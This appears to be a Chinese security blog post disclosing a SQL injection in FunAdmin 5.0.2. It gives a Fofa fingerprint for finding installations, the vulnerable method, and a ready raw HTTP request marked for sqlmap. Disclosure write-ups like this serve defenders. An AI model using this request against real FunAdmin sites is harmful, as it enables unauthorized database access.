#  Funadmin v5.0.2 存在SQL注入漏洞   
王桀  星悦安全   2025-04-23 08:23  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
█   
该文章来自楚风安全-王桀师傅   
█  
  
FunAdmin 基于thinkphp8.X +Layui2.9.*+requirejs开发权限(RBAC)管理框架，框架中集成了权限管理、模块管理、插件管理、后台支持多主题切换、配置管理、会员管理等常用功能模块，以方便开发者快速构建自己的应用。框架专注于为中小企业提供最佳的行业基础后台框架解决方案  
  
Fofa指纹:  
"FunAdmin"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f7V6mkYJot3IEyqxqhiaGzaa3lF0NYLIFAyR75pLjfGLfOUCv7vRibrOftUbyGFOibad0L4xwqAzZyQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5f7V6mkYJot3IEyqxqhiaGzazrnicGCKLODolkNffIyy8YQKkKhQB8zLCUFDicWnRf3skdYXtMIZicJibw/640?wx_fmt=jpeg "")  
  
漏洞版本：5.0.2  
## 0x01 漏洞研究&复现  
  
漏洞发生在 Funadmin\addons\curd\app\curd\controller\Table.php # fieldlist 方法 Fieldlist 调用 getFieldList 方法并传入未处理的 ID 值  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f7V6mkYJot3IEyqxqhiaGzaaeXp1n5589lUsxJvJQCkXsElrnuVyFfNve4Xic73HwWhWMnpKibzbmzw/640?wx_fmt=png&from=appmsg "")  
  
该 ID 未被过滤并直接连接到 SQL 语句中，导致 SQL 注入  
  
  
  
Payload (保存数据包后Sqlmap跑):  
  
```
GET /curd/table/fieldlist?id=fun_test* HTTP/1.1
Host: 192.168.0.105
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=84a79679dc650a2da1270dfa0aed683d; Hm_lvt_8dcaf664827c0e8ae52287ebb2411aed=1726387527; HMACCOUNT=95CE0233E2123413; auth_account=YToxOntzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI3OiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdFpXMWlaWEpmYVdRaU9qTTBORFlzSW1Gd2NHbGtJam9pSWl3aVlYQndjMlZqY21WMElqb2lJaXdpYVhOeklqb2lhSFIwY0hNNkx5OTNkM2N1Wm5WdVlXUnRhVzR1WTI5dElpd2lZWFZrSWpvaWFIUjBjSE02THk5M2QzY3VablZ1WVdSdGFXNHVZMjl0SWl3aWMyTnZjR1Z6SWpvaWNtOXNaVjloWTJObGMzTWlMQ0pwWVhRaU9qRTNNall6T1RFeU5qWXNJbTVpWmlJNk1UY3lOak01TVRJMk5pd2laWGh3SWpveE56STNNRGd5TkRZMmZRLjZOcloyN2ozclluNW82V29rXzMxZlEwRmxIdlB5ZlgtSm9GTnBIMTExWDAiO30%3D; clound_account=YTo0OntzOjI6ImlkIjtpOjM0NDY7czo4OiJ1c2VybmFtZSI7czo0OiJjZW5nIjtzOjg6Im5pY2tuYW1lIjtzOjA6IiI7czo2OiJhdmF0YXIiO3M6Mzc6Ii9zdGF0aWMvZnJvbnRlbmQvaW1hZ2VzL2F2YXRhci8xMi5qcGciO30%3D; Hm_lpvt_8dcaf664827c0e8ae52287ebb2411aed=1726403989; think_lang=zh-cn; tablename=fun_addons_demo_cate
Connection: close

```  
  
  
## 0x02 FunAdmin 下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
  
**源码关注公众号，发送 250423 获取!**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
